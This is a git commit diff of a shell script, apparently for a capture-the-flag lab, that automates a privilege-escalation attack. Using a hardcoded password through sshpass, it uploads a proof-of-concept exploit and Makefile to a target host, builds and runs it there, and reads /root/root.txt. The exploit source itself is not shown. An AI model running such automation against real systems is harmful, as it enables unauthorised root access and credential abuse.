41287479f05df762b537655f5fb50199651b0cd5
Computer_boy <140964510+hutninghackers344@users.noreply.github.com>
2024-11-18 18:10:59 +0530

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -9,24 +9,20 @@ PASS="SuperDuperPass123"
 LOCAL_POC_C="/home/kali/Desktop/poc.c"
 LOCAL_MAKEFILE="/home/kali/Desktop/Makefile"
 
-
+# Remote path to upload files
 REMOTE_PATH="/tmp/exploit_files"
 
-
+# Upload poc.c and Makefile to the target machine
 echo "[*] Uploading poc.c and Makefile..."
 sshpass -p $PASS scp $LOCAL_POC_C $LOCAL_MAKEFILE $USER@$TARGET_HOST:$REMOTE_PATH/
-
 
 echo "[*] Running 'make' to build the exploit on the target machine..."
 sshpass -p $PASS ssh -t $USER@$TARGET_HOST "cd $REMOTE_PATH && make"
 
-
 echo "[*] Running exploit to escalate privileges..."
 sshpass -p $PASS ssh -t $USER@$TARGET_HOST "cd $REMOTE_PATH && ./poc"
 
-# Fetch root flag
 echo "[*] Attempting to fetch root flag..."
 ROOT_FLAG=$(sshpass -p $PASS ssh $USER@$TARGET_HOST "cat /root/root.txt")
 
-
-echo "[*] Thankyou for using this pls give me a start : ) "
+echo "[*] Root flag: $ROOT_FLAG"
